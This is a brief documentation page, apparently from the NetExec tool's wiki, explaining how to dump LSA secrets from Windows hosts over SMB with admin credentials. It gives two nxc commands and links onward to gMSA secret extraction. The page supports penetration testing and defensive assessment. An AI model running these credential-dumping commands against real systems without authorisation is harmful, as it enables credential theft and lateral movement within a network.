# Dump LSA

### Dump LSA secrets using methods from secretsdump.py

{% hint style="danger" %}
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
{% endhint %}

```bash
nxc smb $TARGET/24 -u $USER -p $PASSWORD --lsa
```

If this command fail you can also try the old method (similar to secretdump)

```bash
nxc smb $TARGET/24 -u $USER -p $PASSWORD --lsa secdump
```

If you found an account starting with _SC\_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} you can get the account behind:

{% content-ref url="../../ldap-protocol/extract-gmsa-secrets.md" %}
[extract-gmsa-secrets.md](../../ldap-protocol/extract-gmsa-secrets.md)
{% endcontent-ref %}
